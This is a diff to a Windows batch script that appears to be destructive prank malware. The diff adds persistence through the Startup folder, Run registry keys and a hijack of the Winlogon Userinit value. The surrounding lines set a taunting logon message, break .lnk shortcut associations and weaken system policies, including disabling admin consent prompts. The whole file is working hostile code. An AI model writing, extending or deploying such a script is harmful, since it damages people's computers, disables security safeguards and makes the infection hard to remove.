@@ -1,5 +1,9 @@
 @echo off
 
+copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "batbat" /t REG_SZ /d "%0" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "bat_%random%" /t REG_SZ /d "%~f0" /f 2>nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
 assoc .lnk=.xDDD
@@ -77,3 +81,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Ena
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+
